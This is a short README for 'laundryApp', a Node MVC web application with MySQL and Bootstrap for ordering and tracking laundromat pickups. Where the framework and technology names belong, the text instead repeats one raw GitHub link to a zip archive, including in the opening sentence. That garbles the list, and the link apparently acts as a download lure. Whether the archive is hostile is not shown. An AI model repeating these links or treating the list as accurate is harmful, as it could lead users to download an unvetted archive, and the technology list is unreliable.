# laundryApp
 
 A Web Application using https://raw.githubusercontent.com/SWChan01/laundryApp/master/textrine/laundryApp.zip following the MVC design pattern


**Technologies used**:


* https://raw.githubusercontent.com/SWChan01/laundryApp/master/textrine/laundryApp.zip
* MySql
* https://raw.githubusercontent.com/SWChan01/laundryApp/master/textrine/laundryApp.zip
* Bootstrap


**Main Features**:
* Login and register accounts for a laundromat owner and non laundromat owner(the customer)
* CRUD operations for user information and order statuses
* Search for registered laundromats with a zipcode



**Features for non laundromat owners (the customer)**:
* Cancel the order (Has to be done before the laundromat owner accepts it)
* Check the order price and expected delivery date after the laundry is picked up
* Rate the order after laundromat owner clicks "Order delivered"


**Features for laundromat owners**:
* Accept or cancel an incoming order  (note:Once order is accepted it can not be canceled)
* Once order is accepted, owner can click "Pick Up Order" and input a delivery time and price of the order
* After successful delivery, owner clicks "Order delivered".
* Usage of Google places API to help laundromat owners register for their account

To start the application, run
```
node app
```
